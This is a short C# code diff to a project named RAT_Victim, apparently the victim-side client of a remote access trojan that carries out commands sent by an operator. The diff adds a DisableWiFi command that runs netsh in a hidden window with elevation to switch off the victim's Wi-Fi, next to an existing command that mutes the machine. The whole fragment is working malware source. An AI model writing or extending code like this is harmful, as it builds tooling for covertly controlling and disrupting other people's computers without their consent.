@@ -1,6 +1,7 @@
 ﻿using Microsoft.Win32;
 using RAT_Library;
 using System;
+using System.Diagnostics;
 using System.IO;
 using System.Net;
 using System.Net.Sockets;
@@ -55,6 +56,15 @@ namespace RAT_Victim
                         break;
                     case RatCommand.Mute:
                         WinApi.keybd_event(Keys.VolumeMute, 0, 0, 0);
+                        break;
+                    case RatCommand.DisableWiFi:
+                        var process = new Process();
+                        process.StartInfo = new ProcessStartInfo("netsh", "interface set interface \"Wi-Fi\" disabled")
+                        {
+                            WindowStyle = ProcessWindowStyle.Hidden,
+                            Verb = "runas"
+                        };
+                        process.Start();
                         break;
                     default:
                         throw new ArgumentOutOfRangeException();
